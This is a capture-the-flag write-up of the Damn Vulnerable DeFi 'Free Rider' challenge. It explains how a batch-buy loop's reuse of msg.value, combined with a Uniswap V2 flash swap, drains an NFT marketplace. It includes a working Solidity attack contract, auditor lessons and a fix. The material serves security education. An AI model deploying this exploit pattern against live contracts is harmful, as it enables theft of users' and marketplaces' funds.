---
title: 'Damn Vulnerable DeFi - Free Rider'
description: 'Exploiting msg.value reuse in batch processing. Learn how to combine Uniswap V2 flash swaps with a faulty NFT marketplace loop to drain an entire collection for the price of one.'
date: 2025-07-02
tags: ['solidity', 'security', 'nft', 'flash-loan', 'msg-value-reuse', 'audit', 'damn-vulnerable-defi','ctf']
image: '../../../../public/damn-vulnerable-defi.png'
authors: ['thesandf']
---

# 🏎️ Free Rider - The Batch Processing Loophole

## Challenge Overview

A new NFT marketplace has launched with 6 NFTs, each priced at **15 ETH**. There's also a recovery bounty: if you collect all 6 NFTs and send them to the `FreeRiderRecoveryManager`, you earn a **45 ETH reward**.

**The Catch:** You only have **0.1 ETH**. You can't even afford one NFT.

**The Mission:** Use a flash loan to acquire all 6 NFTs, claim the bounty, and repay the loan—all while starting with almost nothing.

---

## Technical Analysis

### Vulnerability 1: `msg.value` Reuse in Loops

The `FreeRiderNFTMarketplace` allows users to buy multiple NFTs in a single transaction via `buyMany`. Internally, it loops through the IDs and calls `_buyOne`:

```solidity
function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId];
    if (priceToPay == 0) revert TokenNotOffered(tokenId);
    
    // [VULNERABILITY] Checks the GLOBAL msg.value against the SINGLE item price
    if (msg.value < priceToPay) revert InsufficientPayment();
    
    // ... transfer logic ...
}
```

In Ethereum, `msg.value` remains constant for the entire duration of the transaction. If you send 15 ETH and call `buyMany` for 6 items (each priced at 15 ETH), the check `msg.value < priceToPay` will pass for **every single item** in the loop. The contract never subtracts from `msg.value` (because it's immutable) and never tracks if the *total* price has been paid.

### Vulnerability 2: Zero-Capital Requirement (Flash Loans)

While we can buy 6 NFTs for the price of 1, we still need that initial 15 ETH. Since we only have 0.1 ETH, we must use a **Uniswap V2 Flash Swap** to borrow the 15 WETH needed for the first purchase.

---

## The Exploit: The Multi-Step Heist

1.  **Flash Swap:** Borrow 15 WETH from the Uniswap V2 pair.
2.  **Unwrap:** Convert the 15 WETH into native ETH (the marketplace only accepts ETH).
3.  **Exploit the Loop:** Call `buyMany([0, 1, 2, 3, 4, 5])` with `msg.value = 15 ether`. The contract gives us all 6 NFTs but only "verifies" the 15 ETH once per item.
4.  **Claim Bounty:** Transfer all 6 NFTs to the `FreeRiderRecoveryManager`. This triggers the 45 ETH payout to our contract.
5.  **Repay & Profit:**
    *   Convert 15.1 ETH (approximate loan + fee) back into WETH.
    *   Repay the Uniswap pair.
    *   Pocket the remaining ~30 ETH.

---

## Proof of Concept (PoC)

```solidity
contract FlashBorrower is IERC721Receiver {
    function uniswapV2Call(address, uint amt, uint, bytes calldata) external {
        // 1. Convert borrowed WETH to ETH
        weth.withdraw(amt);

        // 2. Buy 6 NFTs for the price of 1 (15 ETH)
        uint256[] memory ids = new uint256[](6);
        for (uint i=0; i<6; i++) ids[i] = i;
        marketplace.buyMany{value: amt}(ids);

        // 3. Send NFTs to recovery to get the bounty
        for (uint i=0; i<6; i++) {
            nft.safeTransferFrom(address(this), address(recovery), i, abi.encode(player));
        }

        // 4. Repay flash loan with the bounty money
        uint fee = (amt * 3) / 997 + 1;
        weth.deposit{value: amt + fee}();
        weth.transfer(address(pair), amt + fee);
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
```

---

## Auditor's Lessons

1.  **Never Use `msg.value` Inside Loops:** When processing multiple payments in one transaction, track a "running balance" and ensure the total amount paid covers the sum of all items.
2.  **State Management:** Ensure that any state changes (like transferring an NFT) properly update the accounting for the entire transaction, not just the local scope.
3.  **WETH/ETH Parity:** If your marketplace handles large sums, consider supporting both WETH and ETH to prevent unnecessary wrapping/unwrapping steps that can be exploited in flash loan contexts.
4.  **Batch Limit:** Implement a maximum number of items that can be processed in a single `buyMany` call to mitigate the impact of unforeseen logic errors.

---

## Remediation

Refactor the `buyMany` function to track the total price:

```solidity
function buyMany(uint256[] calldata tokenIds) external payable {
    uint256 totalCost = 0;
    for (uint256 i = 0; i < tokenIds.length; i++) {
        totalCost += offers[tokenIds[i]];
        _buyOne(tokenIds[i]);
    }
    require(msg.value >= totalCost, "Total cost not covered");
}
```
